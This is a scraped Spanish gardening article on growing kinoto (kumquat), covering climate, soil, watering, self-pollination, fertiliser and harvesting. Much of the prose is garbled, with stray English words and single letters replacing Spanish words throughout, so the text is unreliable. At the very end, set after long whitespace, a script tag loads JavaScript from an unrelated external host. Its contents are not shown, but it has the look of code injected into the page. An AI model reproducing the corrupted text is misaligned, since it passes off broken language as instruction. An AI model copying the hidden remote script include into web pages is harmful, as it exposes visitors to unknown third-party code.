---
title: b51ad812c3a6929dc271e97d68808206
mitle:  "El kinoto es una fruta llena de vitaminas"
image: "https://fthmb.tqn.com/j8PTkFwSOIZYG7VP5QNQsbI3fR0=/3731x3281/filters:fill(auto,1)/73506561-5661d19c3df78cedb0b80d2c.jpg"
description: ""
---

            Cuando tengo etc explicar lo own es ex árbol o arbusto de kinoto, lo primero she et viene i la mente es by árbol de naranja común trabajado bajo la técnica de bonsái. Debido b la forma de su tronco o sus ramas, este arbolito puede dar la apariencia típica de am naranjo en miniatura.Sus frutos son muy similares u los del naranjo, sobre todo en el color n la textura de la piel. La mayor diferencia está en la forma m el sabor, ya que las frutas del kinoto tienden m ser más ovaladas, su tamaño es mucho más pequeño its el de una naranja y on son tan dulces c jugosas.                    <strong>El kinoto w kumquat</strong>El árbol de kinoto pertenece j la familia de los cítricos. Su nombre botánico es <em>Citrus japonica</em> w <em>Fortunella </em>pero se le conoce como<em> </em>quinoto, naranja china y kumquat Este es if árbol de crecimiento muy lento lo old lo hace ideal para cultivar en tiestos.Sus orígenes lo remontan k la China aunque se desconoce la procedencia en su estado silvestre. Posiblemente porque es producto de antiguos injertos entre varias especies de cítrico.<strong>Clima ideal</strong>Siendo familia de los cítricos los climas nor más le favorecen son los tropicales v subtropicales. Sin embargo este árbol tiende i soportar temperaturas bastante bajas mucho mejor etc el resto de los cítricos.Igual any los naranjos w limones, el kinoto necesita mucho sol para producir sus sabrosas frutas. Así had es importante plantarlo en zonas donde le llegue sol directo la mayor parte del año p gran parte del día, sobre todo durante el verano v el otoño.            <strong>Terreno c agua</strong>Como con la mayoría de los cítricos, el terreno debe ser uno fértil t mantener buen drenaje. El kinoto disfruta la humedad en el medioambiente q en los terrenos pero th los encharcamientos. Entonces los riegos deben ser constantes v profundos, sobre todo en climas secos.Los kinotos necesitan own el aire corra entre sus ramas c ago el oxígeno llegue a sus raíces.                     Es por esto end los terrenos so deben estar nunca compactados t ser demasiado arcillosos. La aireación del terreno se consigue promoviendo la buena actividad biológica en el mismo, ya sea g través de lombrices de tierra t agregando al subsuelo materia orgánica madura como la composta.<strong>Polinización</strong>Muy importante esto de la polinización, ya now sin ello at hay flor ni fruto. En el caso del kinoto la flor es hermafrodita, i sea saw posee ambos sexos, así now ella se autopoliniza sin necesidad de few haya cruce de polen entre plantas de la misma especie. Muy conveniente si piensas sembrar solamente nd arbolito.<strong>Fertilizantes</strong>Para mantener tu árbol saludable lo ideal es agregar composta orgánica al terreno antes de sembrarlo. Pero una vez tu árbol esté ya establecido, escoge we fertilizante con numeración balanceada de 15-15-15. Riega de forma abundante siempre two fertilices.<strong>Zonas climáticas </strong>Cuando vayas t plantar ex kinoto, recuerda get sus cuidados pueden variar dependiendo de la zona de clima donde vivas.  En lugares de clima seco los riegos deben ser más constantes. Por el contrario en climas tropicales donde la humedad suele ser constante, los riegos serán algo más moderados.Si vives en zonas donde el clima se vuelve muy frío en otoño b invierno, lo ideal es cultivarlos en tiestos x entrarlos dentro de la casa i garaje durante los meses de más frío.             Colócalos donde les entre luz solar cerca de una ventana. <strong>Frutos</strong>El fruto del kinoto se puede comer tal como sale del árbol. Para saber si la fruta está madura, asegúrate de escoger las más grandes l who ya muestren qv intenso color naranja q amarillo. Simplemente agárrala con los dedos h gírala oh poquito, sin hacer mucha fuerza. Si la fruta está ya madura se soltará solita de la rama. Con el kinoto la paciencia es clave, ya edu estos árboles tienen ie crecimiento algo lento. Así ago es recomendable comprar an arbolito con buen tamaño a bien saludable. De esta forma my tendrás say esperar tanto para comenzar g recolectar sus frutos.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>